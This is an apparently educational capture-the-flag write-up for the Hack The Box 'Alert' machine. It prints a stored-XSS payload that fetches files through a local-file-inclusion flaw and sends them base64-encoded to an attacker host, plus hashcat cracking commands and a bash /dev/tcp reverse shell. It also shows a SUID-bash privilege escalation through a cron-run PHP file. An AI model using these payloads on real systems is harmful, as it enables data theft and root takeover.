HTB Alert

Target: 10.129.231.188
OS: Linux
Difficulty: Easy

Enumeration

The web app at alert.htb is a Markdown Viewer that lets users upload .md files and renders them as HTML. There's also a Contact Us form, an About page, and a Donate page. The app uses index.php?page= parameter to load different pages.

Key finding: the markdown renderer does NOT sanitize HTML tags. Any HTML or JavaScript inside a .md file gets rendered and executed in the browser.

XSS (Stored)

Uploading a .md file with JavaScript inside it causes the script to execute when anyone views the rendered markdown. The app gives a share link after upload.

The Contact Us form is reviewed by an admin bot. Submitting the share link to the markdown file through the contact form causes the admin bot to visit it, triggering the XSS in the admin's browser.

Cookie stealing does NOT work because cookies are marked HttpOnly. document.cookie returns empty. Confirmed by multiple payload attempts (script tags, img onerror).

XSS + LFI Chain

The index.php?page= parameter is vulnerable to Local File Inclusion but only from authenticated/admin sessions. Direct traversal from an unauthenticated session returns "Page not found."

The attack chain:
1. Create a .md file with an XSS payload that makes the victim's browser fetch an LFI path and exfiltrate the response
2. Upload the .md file to the markdown viewer
3. Submit the share link through the Contact Us form
4. Admin bot visits the link, XSS fires in their browser
5. Admin's browser fetches the LFI URL (e.g. index.php?page=../../../etc/passwd)
6. JavaScript sends the response (base64 encoded) back to attacker's PHP server

Example payload in the .md file:
<script>
fetch('http://alert.htb/index.php?page=../../../etc/passwd')
.then(r=>r.text())
.then(d=>fetch('http://ATTACKER_IP:4444/grabber.php?d='+btoa(d)))
</script>

PHP listener setup:
php -S 0.0.0.0:4444

The base64 data hits the listener as a GET parameter. Decode with:
echo 'BASE64_STRING' | base64 -d

Files Exfiltrated via LFI

/etc/passwd revealed valid users including albert
.htpasswd file contained an Apache MD5 hash: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ

Cracking the Hash

The $apr1$ prefix means Apache MD5. Cracked with hashcat:
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

Or john:
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Used the cracked password to SSH in as albert.

Privilege Escalation

Found /opt/website-monitor/ which is a PHP script that runs as root on a cron job. The script does:
include('config/configuration.php');

The configuration.php file permissions:
-rwxrwxr-x 1 root management

Albert is a member of the management group, so he can write to this file. Whatever PHP code is placed in configuration.php gets executed as root when the cron runs.

Method 1 (SUID bash, preferred):
echo '<?php system("chmod u+s /bin/bash"); ?>' > /opt/website-monitor/config/configuration.php

Wait for cron, then verify with ls -la /bin/bash (look for the s in -rwsr-xr-x), then:
/bin/bash -p

The -p flag tells bash not to drop SUID privileges. Gives a root shell.

Method 2 (chown to read specific files):
echo '<?php system("chown albert /root/root.txt"); ?>' > /opt/website-monitor/config/configuration.php

Wait for cron, then:
cat /root/root.txt

Method 3 (reverse shell as root):
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'\''"); ?>' > /opt/website-monitor/config/configuration.php

Set up listener: nc -lvnp 1337

Note: the cron job overwrites configuration.php periodically, so using a text editor may fail with "file on disk changed." Always use echo from the command line to write to it.

Key Lessons

1. HttpOnly cookies block document.cookie but XSS is still useful for session riding and file exfiltration
2. Chain vulnerabilities: XSS alone couldn't get a shell, LFI alone didn't work unauthenticated, but XSS + LFI through the admin's browser worked
3. Markdown renderers that don't sanitize HTML are a direct XSS vector
4. Contact forms reviewed by admin bots are the trigger mechanism on HTB boxes with XSS
5. $apr1$ is Apache MD5, hashcat mode 1600
6. Always check group memberships with id and look for group-writable files in cron jobs or automated scripts
7. chmod u+s sets the SUID bit meaning anyone runs the file as the file owner. For root-owned /bin/bash this gives instant root with bash -p
8. SUID bash is preferred over reverse shell for privesc because it's persistent, instant, and doesn't need a listener
9. When a cron job overwrites your file, use echo to write instead of a text editor
10. fetch() in XSS payloads automatically includes the victim's cookies in same-origin requests even when HttpOnly is set
